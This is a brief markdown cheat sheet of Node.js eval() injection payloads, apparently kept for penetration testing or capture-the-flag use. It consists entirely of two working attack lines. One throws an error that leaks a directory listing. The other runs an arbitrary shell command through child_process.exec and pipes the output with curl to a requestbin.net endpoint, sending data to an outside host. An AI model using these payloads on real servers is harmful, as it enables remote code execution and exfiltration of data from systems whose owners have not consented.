# Nodejs

## eval()

payloads:

	(()=>{throw `${JSON.stringify(fs.readdirSync("."))}`})()

	require("child_process").exec("{cmd} | curl https://requestbin.net/xxxxxx -T -");